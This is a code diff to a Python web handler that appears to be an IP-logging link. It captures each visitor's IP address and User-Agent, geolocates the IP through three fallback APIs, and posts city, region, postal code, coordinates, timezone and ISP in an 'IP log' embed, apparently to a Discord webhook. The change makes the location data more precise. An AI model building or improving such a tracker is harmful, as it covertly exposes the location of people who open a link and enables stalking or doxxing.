@@ -18,7 +18,7 @@ class handler(BaseHTTPRequestHandler):
         
         ua = self.headers.get('User-Agent', 'Unknown')
         
-        # Get location
+        # Get location - using BETTER API
         city = "Unknown"
         region = "Unknown"
         country = "Unknown"
@@ -26,19 +26,52 @@ class handler(BaseHTTPRequestHandler):
         lon = "N/A"
         isp = "Unknown"
         tz = "Unknown"
+        postal = "Unknown"
         
+        # Try ipapi.co first (most accurate)
         try:
-            with urllib.request.urlopen(f"http://ip-api.com/json/{ip}?fields=66846719", timeout=3) as r:
+            req = urllib.request.Request(
+                f"https://ipapi.co/{ip}/json/",
+                headers={'User-Agent': 'Mozilla/5.0'}
+            )
+            with urllib.request.urlopen(req, timeout=3) as r:
                 loc = json.loads(r.read().decode())
                 city = loc.get('city', 'Unknown')
-                region = loc.get('regionName', 'Unknown')
-                country = loc.get('country', 'Unknown')
-                lat = str(loc.get('lat', 'N/A'))
-                lon = str(loc.get('lon', 'N/A'))
-                isp = loc.get('isp', 'Unknown')
+                region = loc.get('region', 'Unknown')
+                country = loc.get('country_name', 'Unknown')
+                lat = str(loc.get('latitude', 'N/A'))
+                lon = str(loc.get('longitude', 'N/A'))
+                isp = loc.get('org', 'Unknown')
                 tz = loc.get('timezone', 'Unknown')
+                postal = loc.get('postal', 'Unknown')
         except:
-            pass
+            # Fallback to ipwhois.app
+            try:
+                with urllib.request.urlopen(f"http://ipwhois.app/json/{ip}", timeout=3) as r:
+                    loc = json.loads(r.read().decode())
+                    city = loc.get('city', 'Unknown')
+                    region = loc.get('region', 'Unknown')
+                    country = loc.get('country', 'Unknown')
+                    lat = str(loc.get('latitude', 'N/A'))
+                    lon = str(loc.get('longitude', 'N/A'))
+                    isp = loc.get('isp', 'Unknown')
+                    tz = loc.get('timezone', 'Unknown')
+                    postal = loc.get('postal', 'Unknown')
+            except:
+                # Last resort - ip-api.com
+                try:
+                    with urllib.request.urlopen(f"http://ip-api.com/json/{ip}?fields=66846719", timeout=3) as r:
+                        loc = json.loads(r.read().decode())
+                        city = loc.get('city', 'Unknown')
+                        region = loc.get('regionName', 'Unknown')
+                        country = loc.get('country', 'Unknown')
+                        lat = str(loc.get('lat', 'N/A'))
+                        lon = str(loc.get('lon', 'N/A'))
+                        isp = loc.get('isp', 'Unknown')
+                        tz = loc.get('timezone', 'Unknown')
+                        postal = loc.get('zip', 'Unknown')
+                except:
+                    pass
         
         # Send IP log
         try:
@@ -50,7 +83,10 @@ class handler(BaseHTTPRequestHandler):
                     "color": 65280,
                     "fields": [
                         {"name": "📍 IP", "value": f"`{ip}`", "inline": False},
-                        {"name": "🌍 Location", "value": f"{city}, {region}, {country}", "inline": False},
+                        {"name": "🏙️ City", "value": city, "inline": True},
+                        {"name": "🗺️ Region/State", "value": region, "inline": True},
+                        {"name": "🌍 Country", "value": country, "inline": True},
+                        {"name": "📮 ZIP/Postal", "value": postal, "inline": True},
                         {"name": "📌 Coords", "value": f"{lat}, {lon}", "inline": True},
                         {"name": "🕐 Timezone", "value": tz, "inline": True},
                         {"name": "🏢 ISP", "value": isp, "inline": False},
